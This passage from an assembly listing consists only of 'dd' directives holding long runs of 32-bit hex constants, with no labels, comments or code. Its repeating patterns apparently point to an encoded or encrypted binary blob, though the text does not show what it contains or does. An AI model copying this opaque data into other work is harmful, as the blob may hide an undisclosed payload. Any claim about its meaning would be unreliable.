		dd 95C19603h, 0A4E17030h, 0C4796557h, 53484F62h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	8F070821h
		dd 90302DC5h, 81B4D0E1h, 0A764A890h, 2146534Ah,	0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 34C19707h
		dd 0D8E17034h, 607961B5h, 0BB484B88h, 7092147h,	302DC196h
		dd 0B4D0E170h, 64AC7961h, 4653484Fh, 96070921h,	69302CC1h
		dd 51B4D0E5h, 0F764AC78h, 94657A6h, 0C1960708h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h, 0C9E17130h
		dd 0F47961B0h, 0B7484F65h, 0AF0925A9h, 302DC198h, 0B4D0E170h
		dd 64AC7961h, 4653484Fh, 96070921h, 70302DC1h, 78B4D1E1h
		dd 0CF64AC7Dh, 0B1465349h, 699603F7h, 0E1703025h, 7961B4D0h
		dd 484F64ACh, 9214653h,	2DC19607h, 0D0E17030h, 0B57960B4h
		dd 0FB484F60h, 3B092147h, 0F82DC491h, 0B4D0E176h, 64AC7961h
		dd 4653484Fh, 96070921h, 70302DC1h, 61B4D0E1h, 5664AD79h
		dd 0F146534Ch, 0C9960708h, 89703523h, 7961B4D5h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	4A484E64h
		dd 0FF092142h, 442DC197h
		dd 1CD0E463h, 64AC7944h, 4653484Fh, 96070921h, 70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 38465248h, 0E196070Dh,	0C170302Fh
		dd 0D161B1E9h, 484F64BCh, 9214653h, 2DC19607h, 0D0E17030h
		dd 0AC7961B4h, 53484F64h, 1E092046h, 782DC192h,	78D0E172h
		dd 0ECAC7C28h, 46534846h, 96070921h, 70302DC1h,	61B4D0E1h
		dd 4F64AC79h, 21465348h, 0D8960609h, 91703029h,	2161B4D2h
		dd 204F61FFh, 9214657h,	2DC19607h, 0D0E17030h, 0AC7961B4h
		dd 53484F64h, 7092146h,	312DC096h, 2CD0E170h, 642C7963h
		dd 4653484Fh, 96070921h, 70302DC1h, 78B4D1E1h, 0FF64AC7Dh
		dd 0B146534Ah, 8B9603AEh, 0E1703021h, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AD7963B4h,	0B3484F64h
		dd 5892144h, 382DC196h,	0B450E173h, 64AC7961h, 4653484Fh
		dd 96070921h, 69302CC1h, 99B4D0E5h, 9364AC7Bh, 94657FBh
		dd 0C196070Bh, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0C9E17130h, 8C7961B0h, 57484F67h,	2F0925F0h
		dd 302DC194h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 60B4D1E1h, 764AC79h, 21C6534Bh, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 514F65ACh, 69214657h,	0E9C19604h
		dd 7EE17567h, 0AC7961B4h, 53484F64h, 77092146h,	182DC5A5h
		dd 84D0E170h, 4AC7961h,	4753484Fh, 96070D21h, 70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F64ACh, 92146D3h, 0ADC11687h, 50E17030h
		dd 2C79E1B4h, 0D3484FE4h, 0C709A1C6h, 302D0156h, 0B4D01E70h
		dd 64AC7961h, 0B953B7B0h, 69070921h, 8F30D2C1h,	9EB4D01Eh
		dd 5E645386h, 30574259h, 0D0871618h, 0F061213Ch, 6870A5C1h
		dd 595E75BDh, 18305742h, 2CD18716h, 0C1F06121h,	0BD6870A5h
		dd 42595E75h, 16183057h, 213CD087h, 84E3F261h, 75BD7861h
		dd 5742595Eh, 87161830h, 61213CD0h, 70A5C1F0h, 0CCEBBF68h
		dd 2046637Bh, 0D0871618h, 0F061213Ch, 6870A5C1h, 595E75BDh
		dd 0B11E5542h, 1DF225BFh, 0C1F07030h, 0BD6870A5h, 42595E75h
		dd 16183057h, 0BB12F287h, 3F5B6AFBh, 64AC4A52h,	5742595Eh
		dd 87161830h, 61213CD0h, 0D98BEFF0h, 0F7DC14C1h, 1275EBF0h
		dd 0D0870709h, 0F061213Ch, 6870A5C1h, 0B3CC5BBDh, 82AACDD8h
		dd 0A64A1D8Ch, 0D0E14303h, 0BD6870B5h, 42595E75h, 0FFBA1E57h
		dd 8895792Eh, 0C6859C8h, 571FC1D9h, 5742497Fh, 87161830h
		dd 4FBB12D0h, 0EA3F5B6Ah, 0C4EF27F2h, 0AACDD8C3h, 0D087378Ah
		dd 0F061213Ch, 46D98BC1h, 0F0F7DC14h, 0B199FEEBh, 95792EBFh
		dd 0C1F04087h, 0BD6870A5h, 6CC37075h, 8C82AACDh, 0BBA64A1Dh
		dd 3F5B6AFBh, 75AD8AE6h, 5742595Eh, 0A9BF3630h,	0C8889579h
		dd 0D90C6859h, 0F7DC14C1h, 3047E0FFh, 0D0871618h, 62FB0F3Ch
		dd 0F2EA3F2Bh, 0C3C4EF27h, 82AACDD8h, 3CF16D80h, 0C1F06121h
		dd 1FC15EA5h, 0EBF0F79Ch, 707E96FEh, 889579E1h,	0A5E05EC7h
		dd 75BD6870h, 0C5D8775Eh, 1D8C82DAh, 0B7F75A46h, 0EA3FA726h
		dd 5E5457FEh, 30574259h, 792E3818h, 59C88812h, 51DC8ACh
		dd 0F03718D0h, 892F9E4h, 3CD08716h, 5B6A4F21h, 2BF2EA8Bh
		dd 948F88A3h, 8C71E681h, 31DE3A11h, 0A5C1F061h,	0DC144670h
		dd 0C1EBF070h, 0EA737D5Dh, 0F84751BDh, 510B6F56h, 5E75BD68h
		dd 0AACD6C59h, 0B61DFC8Ah, 0AF3E7EEAh, 2A67317h, 78B49F2Bh
		dd 18305742h, 9579A916h, 0AC598883h, 489D85C0h,	2B343388h
		dd 0B4B69EF1h, 213CD097h, 3F5BDE61h, 9B5306EAh,	81D06B1h
		dd 0EEC0CE6Fh, 83CBD646h, 70A5C1E0h, 0F7DC9368h, 1275E0F0h
		dd 2562F836h, 990CDCC9h, 0C6DE0B67h, 595E759Ch,	82AA7942h
		dd 594A1D8Ch, 9EDE4373h, 6BBE2FFAh, 0A8B3B4E3h,	16183076h
		dd 8895FE87h, 36859C8h,	905F86AEh, 31BFACABh, 29B8B696h
		dd 61213CF1h, 0EA3FEFF0h, 0C8EF27F2h, 1EB8AC07h, 651C945h
		dd 1A8BCBAAh, 6870B523h, 0F0F75BBDh, 0B199FEEBh, 0CE2D5973h
		dd 2F1E8FCFh, 13C6DE4Ch, 42594ED7h, 8C821E57h, 0BBA64A1Dh
		dd 781EADFBh, 579F4A22h, 0B9ACB77Ch, 871608DEh,	0C88812D0h
		dd 0D90C6859h, 0B2018C1h, 0E588E7F0h, 0F2A534BAh, 0F061211Eh
		dd 0F2EA8BC1h, 0C3C4EF27h, 82AACDD8h, 0E92D128Ch, 0C1F071B3h
		dd 0BD6870A5h, 0EBF07075h, 0BFB199FEh, 8895792Eh, 701E55C8h
		dd 75BD78D2h, 5742595Eh, 1D8C3630h, 0FBBBA64Ah,	0EA3F5B6Ah
		dd 8B8828F2h, 205752CBh, 0D0871618h, 5988233Ch,	0C1D90C68h
		dd 0B7B09B53h, 0CDEFB2ACh, 6DD197B4h, 0C1F06121h, 278272A5h
		dd 0DCC3C4EFh, 343A1275h, 0F4C1F5A5h, 70C0E083h, 75BD6860h
		dd 0FE6C595Eh, 29BFB199h, 61213CF0h, 0A57AC4F0h, 0B60BD4Ah
		dd 30574249h, 3EA51618h, 128FCFD2h, 6870A5C1h, 8CA370BDh
		dd 0CD255742h, 3CD08706h, 0E3F06121h, 9D4A5287h, 42595E75h
		dd 0C3C73557h, 7461D187h, 0A5C1F071h, 75BD6870h, 5742595Eh
		dd 87161830h, 0B4DC39D0h, 0A570D4F0h, 5E75BD78h, 30574259h
		dd 0D0871618h, 0F061213Ch, 0BDAFA0C1h, 80328ACh, 18305742h
		dd 3CD08716h, 0C1F06121h, 0BD6870A5h, 97A45B75h, 0C7CDE502h
		dd 213CD087h, 0A5C1F061h, 75BD6870h, 5742595Eh,	5AC91D30h
		dd 717C618Dh, 70A5C1F0h, 5E75BD68h, 30574259h, 0D0871618h
		dd 259C243Ch, 68A17814h, 595E75BDh, 18305742h, 3CD08716h
		dd 0C1F06121h, 60B775A5h, 42498BA8h, 16183057h,	213CD087h
		dd 0A5C1F061h, 75BD6870h, 8ABF5C5Eh, 871649EDh,	61213CD0h
		dd 70A5C1F0h, 5E75BD68h, 30574259h, 0D581318h, 0F06131E9h
		dd 6870A5C1h, 595E75BDh, 18305742h, 3CD08716h, 1C0D6421h
		dd 0BD6870B4h, 42595E75h, 16183057h, 213CD087h,	0A5C1F061h
		dd 20E86870h, 5742595Eh, 87161830h, 61213CD0h, 70A5C1F0h
		dd 5E75BD68h, 30574259h, 0D0871618h, 1E61213Ch,	869E4B2Fh
		dd 0B64F6453h, 0F6DEB92Ch, 0D5C196F8h, 2F1E8F37h, 5479614Bh
		dd 0ACB73064h, 0FF0921B9h, 0CFD2C296h, 44D0E18Fh, 9B937961h
		dd 0B65348B0h, 69040921h, 80302D3Eh, 7EB4D0E1h,	0BF64AC86h
		dd 26465348h, 319607F6h, 0E270302Dh, 8961B42Fh,	4B4F64ACh
		dd 0F92146ACh, 2CC19607h, 20E170CFh, 0AD7961B4h, 0A3484F9Bh
		dd 7092146h, 0C02DC169h, 0B4D0E170h, 94AC799Eh,	4653484Fh
		dd 660709DEh, 70302DC1h, 91B4D09Eh, 4F64AC79h, 0D1465337h
		dd 0C1960709h, 11703012h, 7961B4D0h, 0B84F6493h, 9214653h
		dd 0DDC19618h, 0D0E17030h, 5C7961ABh, 53484F64h, 0F7092149h
		dd 302DC196h, 44D0E17Fh, 64AC7961h, 0B6534840h,	96070921h
		dd 80302DC6h, 61B4D0E1h, 0BF64AC7Eh, 21465348h,	3196070Eh
		dd 0E170302Dh, 8961B4DFh, 4F4F64ACh, 0F92146ACh, 2AC19607h
		dd 20E170CFh, 0AB7961B4h, 0AB484F1Bh, 1092146h,	0C82DC1A9h
		dd 0B2D0E170h, 98AC797Eh, 4AAB574Fh, 6A07093Eh,	4CC812C1h
		dd 9EB4D0FEh, 779CD379h, 0DE465357h, 0F16EF8F6h, 1E703032h
		dd 79994B2Fh, 0B74F6493h, 9D9B9ACh, 0D2C19638h,	0D0198FCFh
		dd 537961CBh, 53B0B09Bh, 0F80921B9h, 31D53E69h,	4BD0E18Fh
		dd 6754869Eh, 0B95348B0h, 91FFF6DEh, 8F302D3Eh,	6E4C2F1Eh
		dd 0B064AC86h, 1EBAACB7h, 3E9607F6h, 1E8FCFD2h,	0A161B42Fh
		dd 604F6095h, 29214653h, 6DC19607h, 0D1E17030h,	0AC7965B4h
		dd 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D061h, 0CF642CF9h, 0A1465348h, 41968709h
		dd 617030ADh, 0B9613450h, 484FA46Ch, 921B953h, 2DC19607h
		dd 2FE18FCFh, 537961B4h, 0AC48B064h, 0F80921B9h, 212D3E69h
		dd 0A5C1F061h, 75BD6870h, 5742595Eh, 87161830h,	71303DD0h
		dd 70A5C1F0h, 5E75BD68h, 30574259h, 0F1A5341Ah,	0F061312Dh
		dd 6870A5C1h, 595E75BDh, 0BA997940h, 2DC1A634h,	0C1F06121h
		dd 0BD6870A5h, 0D8C37077h, 343AAACDh, 213CC196h, 0A5C1F061h
		dd 0DC144672h, 0FEEBF0F7h, 87073A92h, 61213CD0h, 0EA4FEFF2h
		dd 0C4EF27F2h, 20C5D8C3h, 0D0871618h, 5988C33Eh, 0C1D90C68h
		dd 38F8DC14h, 18305742h, 0A63A6514h, 6859C8B8h,	5CFEEA0Ch
		dd 42595E75h, 0BFF1D255h, 475A4A2Dh, 3675907h, 75BD6860h
		dd 0CDA8BB5Ch, 51C0BEA9h, 8BB75A06h, 70A5C1E0h,	0F75B576Ah
		dd 5D3A2FC3h, 7EE17B75h, 0F061215Dh, 0F25E4CC3h, 8F88A31Bh
		dd 0F2E68194h, 3CD087F7h, 28628B23h, 40051D33h,	0EC3F3388h
		dd 161820F1h, 0CF9E3985h, 7A2E1E8Fh, 9F6BBEAFh,	574249B4h
		dd 0A58CF232h, 8C4F1EF2h, 0DEC33C0Dh, 5E75DCC6h, 99FEAB5Bh
		dd 0FE654BB1h, 1AB7F7E3h, 6870442Bh, 0C3C49FBFh, 4ADE0AD8h
		dd 0D23E69F8h, 0C1E0C78Fh, 14C199A7h, 9F04F7DCh, 343A1275h
		dd 212C3669h, 3F5B1A63h, 2028F2EAh, 0F597CC04h,	87163A12h
		dd 0C888D5D2h, 0D90C6859h, 0CC8018C1h, 30574249h, 4A1D3818h
		dd 1E8FBFA6h, 0CAA5402Fh, 595E24ADh, 0B1997942h, 1EF265BFh
		dd 23054403h, 0BD68A1A0h, 0ACB75C75h, 1618D2B9h, 1E9D587h
		dd 0A5C1A13Ch, 579F6870h, 5742797Ch, 82C31D30h,	6121ED05h
		dd 70A5C1F0h, 5E75BD68h, 6DA24759h, 0D0870645h,	0F061213Ch
		dd 6870A5C1h, 8C8370BDh, 18304797h, 3CD08716h, 0C1F06121h
		dd 609575A5h, 42595E24h, 16183057h, 213CD087h, 781EF561h
		dd 75BD6860h, 5742595Eh, 87161830h, 0B0DC39D0h,	70A5C1F0h
		dd 5E75BD68h, 30574259h, 80D21318h, 0F061213Ch,	6870A5C1h
		dd 595E75BDh, 18305742h, 0D2D08716h, 281E8FCFh,	4C869ECBh
		dd 0B3B7B063h, 0E7F61E46h, 0D0D2C296h, 542FE170h, 84D37961h
		dd 0A66C484Fh, 76380921h, 902F2DC1h, 81ABD0E1h,	0AF6BAC79h
		dd 0C1495348h, 21910709h, 177302Dh, 9962B4D0h, 0A84C64ACh
		dd 0E9204653h, 0CDC09607h, 30E27030h, 5C6661B4h, 0A35B4F64h
		dd 0FF2A2146h, 0CC6E3995h, 4B531977h, 9BAB819Eh, 0B954B0B0h
		dd 6908F1DEh, 8F2FD53Eh, 9E8B281Eh, 0B01B5486h,	0E1B9ACB7h
		dd 0E9960335h, 0F970302Dh, 4961B4D0h, 494F64ACh, 9214253h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 465348CFh,	160789A1h
		dd 0F0302DC1h, 0E1B450E1h, 0CF64ACF9h, 0E146D3C8h, 0C196C7C9h
		dd 0E170CF2Dh, 7961B4D0h, 0B74F9B53h, 0F6214653h, 0D2C16907h
		dd 2FE170CFh, 0BD799E4Bh, 42595E75h, 16183057h,	213CD087h
		dd 0A5D1E160h, 75BD6870h, 5742595Eh, 96373A12h,	61213CC1h
		dd 72A5C1F0h, 7CE72746h, 3046537Bh, 0D2871618h,	59C88812h
		dd 79528768h, 5B5E75BDh, 82AACD6Ch, 1A4A1D8Ch, 0C3F06131h
		dd 14C19987h, 2CF0F7DCh, 14183047h, 0B7A63A65h,	0CF5B9607h
		dd 77BD6811h, 3AEBB0BCh, 0E97F755Dh, 63213C71h,	0A633EF12h
		dd 34A36BBEh, 325752BFh, 0BD2138F2h, 9E0CDCC1h,	6A70B56Fh
		dd 86B85B54h, 72E6889Dh, 3ED0E6FCh, 2CDEF3CBh, 0D3058D58h
		dd 4059FFDBh, 78BA99BEh, 4BD23E69h, 0A7D1168Bh,	5727F29Ah
		dd 0B9607B7Ch, 8506F6DEh, 0C8889539h, 52F86359h, 5C759C4Ah
		dd 0AECDD8B3h, 82D8F8F6h, 0F261313Ch, 8AD90C28h, 903579Fh
		dd 18304747h, 1C3E6938h, 91AF6121h, 0BD6860F8h,	427B7C77h
		dd 0C3453057h, 213CC05Ah, 0A5C1F061h, 0A8E26870h, 57424983h
		dd 87161830h, 0BC7C3CD0h, 70A5C121h, 5E75BD68h,	0ED084259h
		dd 0D0871608h, 0F061213Ch, 3D25A5C1h, 0B75E75BDh, 0E899B9ACh
		dd 0ED8D69F8h, 50D28F3Fh, 2C789EB4h, 0D3C37064h, 878D3E46h
		dd 0B0E9DE96h, 34C1EE70h, 0E4147661h, 0C6EB4F4Fh, 16E30E21h
		dd 0F0212EC1h, 0E13FD3E1h, 0CF9BAD79h, 0A1825248h, 41870409h
		dd 61C8072Dh, 0B952D3D0h, 0A8AB23D0h, 0F63041AFh, 0D23E91FBh
		dd 2FF07FCCh, 53BD7E48h, 0FB597098h, 2F092578h,	202DC196h
		dd 94D0E170h, 65AC7961h, 46534C4Fh, 96070921h, 70302DC1h
		dd 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h,	0E170302Dh
		dd 7961B4D0h, 484F642Ch, 8921C6D3h, 0ADC19607h,	50E1F030h
		dd 2C796134h, 9348CFE4h, 709E186h, 302D3E96h, 0B4D0E170h
		dd 9BAC869Eh, 0B953484Fh, 6907F621h, 8F302D3Eh,	70B42F1Eh
		dd 4F64AC79h, 32475348h, 0F2A5343Ah, 0DE00031Eh, 0C1D90CEFh
		dd 777FDC14h, 0C5EDCD6Ch, 12F11D8Ch, 1829CC0Fh,	9349D97Ch
		dd 0BFC4C35Bh, 3839AACAh, 0FEE37DA9h, 8BE059BCh, 9B20855Eh
		dd 7963B7C3h, 5E3F3A12h, 4F311E0Dh, 0AD086859h,	7075BDB5h
		dd 56B1D8C3h, 0D2971B45h, 0F041CFD2h, 6860789Ch, 595E579Fh
		dd 1830861Fh, 3CD08716h, 0C1F0B07Ch, 0BD6870A5h, 42594E28h
		dd 16183057h, 0F03CD0D2h, 34C1E071h, 645B4661h,	4694864Fh
		dd 96167921h, 700FAEC1h, 61C83CE1h, 4F751C79h, 21F5EB48h
		dd 0C169F808h, 0E171C722h, 0F8EA3FD9h, 8B7C576Dh, 0F620B990h
		dd 0D2792EC4h, 2FADC3F7h, 7C68517Bh, 7B484B5Bh,	37092146h
		dd 502DC196h, 0B5D0E170h, 64AC7161h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 3E960709h
		dd 0E170CFD2h, 1261B4D0h, 9E4F0FF1h, 0F621909Ch, 0DAC169FCh
		dd 8AE187C3h, 62793BEDh, 0FE4889D2h, 830984DCh,	0DF2DB2F3h
		dd 30D03FA7h, 17AC2B20h, 0B9532326h, 6107E6CAh,	9730CA22h
		dd 8EB4165Fh, 3C6472A2h, 0DE460105h, 2696E0EAh,	16709D8Bh
		dd 8661114Eh, 0A74FBA77h, 0FE21FBE9h, 0D2C150C4h, 6E1BEFBh
		dd 5B79CC1Eh, 0AC4881AFh, 0F809F795h, 8D2D6C3Ch, 19D065F2h
		dd 17AC0218h, 25537177h, 50073811h, 0C5304EA0h,	0F5B48AB8h
		dd 0CB64E630h, 0EF461109h, 5D966C60h, 8A70627Ch, 0AF618DE8h
		dd 964F17DDh, 0DF21C2D1h, 0F3C11285h, 1EE1FCBAh, 7A79E536h
		dd 8548C3EEh, 0F809B5D4h, 0CF2D7420h, 4BD00697h, 9BAC968Eh
		dd 0B153BFB8h, 7907E6CEh, 0CD30CA26h, 0FDB48ABCh, 8164E634h
		dd 8446302Dh, 6C96555Ch, 27705348h, 0CC61C7A5h,	0AF4F0FC1h
		dd 0C721CADDh, 98C11A89h, 2FE10B4Dh, 5B79A773h,	0AC4899B3h
		dd 6C09FF99h, 4B2DF0A2h, 38D0D84Ch, 0F0AC3B24h,	0A9533B3Ah
		dd 0F507D7FEh, 0F43014FDh, 0E5B48ABCh, 0B864C714h, 7B469D9Bh
		dd 2E964D44h, 1670E6F6h, 9661533Bh, 0AF4FBA4Fh,	53219088h
		dd 0D2C1C452h, 27E187CBh, 1798E47h, 0DF48E2CAh,	9B09BDD8h
		dd 0AC2D6430h, 28D03FAFh, 0C1AC869Eh, 0EB53B7B0h, 2307F6DEh
		dd 0CD30D23Eh, 0A7B42F1Eh, 81645386h, 0F746ACB7h, 1F96F8F6h
		dd 670CFD2h, 96614B2Fh,	0BF4F9B53h, 9D21B9ACh, 88C169FCh
		dd 5CE197D3h, 38799E43h, 9548B093h, 8B09DEBDh, 952D3E65h
		dd 62D01E87h, 17AC869Ah, 0C253BFA8h, 0A07F6CEh,	0AE30D232h
		dd 0AB42F1Ah, 0C36443A2h, 8C46A4AFh, 9B96F8FAh,	6570D7E2h
		dd 0CC614B3Bh, 0AF4F9B5Fh, 7221B9A8h, 0A9C169E0h, 5CE18FD7h
		dd 62798E6Fh, 4B48B88Bh
		dd 4D09F7E8h, 4B2D1F28h, 0B4D01E93h, 6CACBFF7h,	4E5386D1h
		dd 8607B4B3h, 6030FB67h, 48B4656Fh, 666472CBh, 4685E6h
		dd 0F096A28Fh, 0D070EE9Bh, 3B61627Eh, 24FBA16h,	4321A994h
		dd 77C148BDh, 0A3E187E3h, 0D7799E6Bh, 0D748B0BBh, 9309C689h
		dd 0AC2D3649h, 0B4D00EABh, 6CACB7FBh, 4E539ED1h, 9E07DF83h
		dd 6030E35Bh, 79B41E7Fh, 576472D3h, 394685EEh, 0E096AA8Fh
		dd 0C070E68Bh, 58617A72h, 614FA236h, 382180CDh,	1CC171B1h
		dd 0E9E1BE96h, 8579BF06h, 3848DB1Dh, 6409DE91h,	432D1F28h
		dd 0CFD01EABh, 17AC86BAh, 3D53968Ch, 1207EEEAh,	0D530C212h
		dd 0CCB42F06h, 0FA645B9Ah, 0CE46ACA3h, 0E096F8F2h, 0C870EE87h
		dd 3B615362h, 1A4F8B12h, 5B21B194h, 77C148B1h, 0A3E1978Eh
		dd 28799E63h, 0CF48B0BFh, 0D109DEA5h, 7A2D3E65h, 0FED016B3h
		dd 7AC96DFh, 2D53B780h,	0ED07F6F2h, 0EC30D216h,	3BB4273Ah
		dd 2C6453BEh, 0B546AC83h, 4D96F8D2h, 7570DFE2h,	0E5614307h
		dd 8E4F9B73h, 0EE21B1B4h, 46C169F0h, 0EE18FFBh,	0CF799E47h
		dd 8548DBE6h, 0C109DEA9h, 0DF2D2641h, 53D01E87h, 93AC8E8Eh
		dd 0F353B7B4h, 6907C79Fh, 7030D23Eh, 61B4D0E1h,	4F64AC79h
		dd 21465348h, 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh
		dd 9214653h, 2DC19607h,	0D0E17030h, 0AC7961B4h,	53484F64h
		dd 7092146h, 302DC196h,	0B4D0E170h, 64AC7961h, 4653484Fh
		dd 96070921h, 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h
		dd 0C1960709h, 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h
		dd 2DC19607h, 0D0E17030h, 0AC7961B4h, 53484F64h, 7092146h
		dd 302DC196h, 0B4D0E170h, 64AC7961h, 4653484Fh,	96070921h
		dd 70302DC1h, 61B4D0E1h, 4F64AC79h, 21465348h, 0C1960709h
		dd 0E170302Dh, 7961B4D0h, 484F64ACh, 9214653h, 2DC19607h
		dd 0D0E17030h, 0AC7961B4h, 51484F64h, 50B2344h,	322FC394h
		dd 0B6D2E372h, 66AE7B63h, 44514A4Dh, 94050B23h,	72322FC3h
		dd 63B6D2E3h, 4D66AE7Bh, 2344514Ah, 0C394050Bh,	0E372322Fh
		dd 0D963B6D2h, 4A4DC40Ch, 0B234451h, 2FC39405h,	0D2E37232h
		dd 0AE7B63B6h, 514A4D66h, 50B2344h, 322FC394h, 0B6D2E372h
		dd 66AE7B63h, 44514A4Dh, 7050B23h, 0D090B555h, 63B67041h
		dd 4D66AE7Bh, 2344514Ah, 0C394050Bh, 0E372322Fh, 7B63B6D2h
		dd 4A4D66AEh, 0B234451h, 2FC39405h, 0D2E37232h,	3D7B63B6h
		dd 0C1CEDFF1h, 0A7A9B9D7h, 322F6136h, 0B6D2E372h, 66AE7B63h
		dd 44514A4Dh, 94050B23h, 72322FC3h, 63B6D2E3h, 4D66AE7Bh
		dd 2344514Ah, 5094050Bh, 58D84ABCh, 0F8CC0268h,	0E8EFE63Dh
		dd 0B23E6F3h, 2FC39405h, 0D2E37232h, 0AE7B63B6h, 514A4D66h
		dd 50B2344h, 322FC394h,	0B6D2E372h, 0F5AE7B63h,	0E790C6DCh
		dd 37A6A880h, 0E6AD8260h, 0C114509Eh, 4D660CD9h, 2344514Ah
		dd 0C394050Bh, 0E372322Fh, 7B63B6D2h, 4A4D66AEh, 0B234451h
		dd 0BCC39405h, 63E0F79Dh, 0FDAC217h, 0F0EBECC7h, 0ABA7AAE5h
		dd 908DBF05h, 0B6D241D0h, 66AE7B63h, 44514A4Dh,	94050B23h
		dd 72322FC3h, 63B6D2E3h, 0DE66AE7Bh, 8B832C8Ch,	4D1A8B85h
		dd 6DFCBCA1h, 0F5ED385Ch, 0D5C6C520h, 0A981D7D2h, 2FC336A7h
		dd 0D2E37232h, 0AE7B63B6h, 514A4D66h, 50B2344h,	0A12FC394h
		dd 16F4DCAh, 0E921F4ECh, 0CBDEC5C2h, 1B8A84ACh,	0FDBDA04Ch
		dd 0CF1B736Ch, 0EFC43DEFh, 234451E8h, 0C394050Bh, 0E372322Fh
		dd 7B63B6D2h, 0D94D66AEh, 8A6EBE0h, 50BCEB7Fh, 0AD9C0D4Dh
		dd 0D1041CC9h, 2E353219h, 7A745C3Bh, 0B9A6BCEBh, 0B6D241F3h
		dd 66AE7B63h, 44514A4Dh, 94050B23h, 0E1322FC3h,	0CA257E52h
		dd 371CD40Bh, 593E2B30h, 0B9EE7F71h, 99084855h,	119CCA8h
		dd 30371CD4h, 0B81E72Bh, 2FC39405h, 0D2E37232h,	0AE7B63B6h
		dd 0C24A4D66h, 979A96F5h, 4459B5F9h, 0C0A49504h, 10D80D15h
		dd 32273C3Bh, 0E2737D55h, 44459B5h, 0C1326895h,	4D66AE7Bh
		dd 2344514Ah, 0C394050Bh, 4DE1322Fh, 0C9CD036Eh, 252209CFh
		dd 644C2B3Eh, 9462EE6Ah, 6859C888h, 0D804D30Ch,	3E252209h
		dd 0A765992Bh, 322FC394h, 0B6D2E372h, 66AE7B63h, 0EAC24A4Dh
		dd 79AA79Fh, 19595F6Ah,	0CDDB988h, 0F0DD15DAh, 295C5B84h
		dd 782FB8C5h, 8819595Ah, 2380CB9h, 4A4D660Ch, 0B234451h
		dd 2FC39405h, 7C707232h, 3FCED675h, 3A2124CDh, 0B564482Fh
		dd 1D0D37h, 0ADCCF830h,	0A8B96421h, 2F3AC5EEh, 0E65DB148h
		dd 72322F61h, 63B6D2E3h, 4D66AE7Bh, 8DD7514Ah, 6C20B1C8h
		dd 8617538Fh, 0C3C2D2B7h, 5E5324BCh, 4B630445h,	1DD29836h
		dd 0B799CA24h, 0F722D9D3h, 514AEFE5h, 50B2344h,	322FC394h
		dd 3241E372h, 0D303D6A0h, 220949DAh, 8EA37145h,	206060DAh
		dd 77F59DB1h, 7D6ABF3Bh, 46E24754h, 9DCABF6Dh, 0E372A85Eh
		dd 7B63B6D2h, 4A4D66AEh, 0B8B04451h, 917D2AB9h,	88BED9A2h
		dd 0B77D1CECh, 140F5E34h, 57596601h, 3E3E83D7h,	0DDCAF842h
		dd 39F1C139h, 44F3DA14h, 94050B23h, 72322FC3h, 0D025D2E3h
		dd 0F2D911B8h, 7925F1E5h, 0D0D68851h, 0AE3F7F6Ah, 3E26FB9Fh
		dd 5B0D29FCh, 6C3C745Dh, 709C2E5Fh, 0D2410C6Dh,	0AE7B63B6h
		dd 514A4D66h, 0B6982344h, 88957957h, 0E9D178DFh, 23E7B138h
		dd 81D7D7Ah, 0D1323C6Fh, 32717D86h, 65F4E2D0h, 113A1420h
		dd 81382616h, 0C394050Bh, 0E372322Fh, 0C8F0B6D2h, 0F1F6DD04h
		dd 89ED5EAh, 63CE5C65h,	0E4D53E7Eh, 99372F80h, 45180823h
		dd 17102F04h, 6F7279CCh, 1458BE2Fh, 66AE7B63h, 44514A4Dh
		dd 31960B23h, 0C2829F75h, 0C3CB6653h, 4ECF6EC6h, 73435249h
		dd 8FA2013Ah, 0A0207718h, 6E218592h, 282FDCF0h,	89892633h
		dd 2FC394A7h, 0D2E37232h, 6CE863B6h, 0DFC4C3D0h, 0A9A8ADCAh
		dd 0A5BC5D15h, 76406FEFh, 2A9F7860h, 0B14077Ah,	81471A63h
		dd 1050959Ch, 0E5D4B081h, 4D66AED9h, 2344514Ah,	107050Bh
		dd 9C0D4D85h, 41CC9ADh,	6769C3D1h, 9791E35Ah, 2BC03396h
		dd 80A63F7Eh, 0B46072A2h, 3229F73Ah, 7E684027h,	322F6114h
		dd 0B6D2E372h, 0DF3D7B63h, 3E2B30E7h, 0EE7F7159h, 5A3955B9h
		dd 5086E1FCh, 4EC13272h, 71011C1Bh, 0DA8A141Fh,	83128872h
		dd 1B03D6B2h, 4A4DC43Bh, 0B234451h, 84509405h, 0BD8C1D98h
		dd 0C1140CD9h, 4D392209h, 350C137Bh, 0A0B9C9D4h, 8782E071h
		dd 72BF776Fh, 2530F02Fh, 0F5646A42h, 7290B567h,	63B6D2E3h
		dd 0FAF5AE7Bh, 482F3A26h, 0A8FF6E60h, 90195944h, 65799ECEh
		dd 0D35579ECh, 8791D9C2h, 2C6A5497h, 0D1E07131h, 0AD7860B5h
		dd 51E8DACFh, 50B2344h,	85BCC394h, 0D0B4851Ah, 0C81D05h
		dd 22372C2Bh, 0BF3CC545h, 591A07EBh, 0E872DADBh, 0DEF529E5h
		dd 88C8E3D7h, 0C09706CBh, 0E3F5922Ch, 7B63B6D2h, 8DDE66AEh
		dd 51791E09h, 7599CE5Fh, 88B92868h, 0C92139ECh,	7411B30h
		dd 5F517612h, 3311FDC3h, 2541701Ch, 0F53DE8F0h,	44D6D9DEh
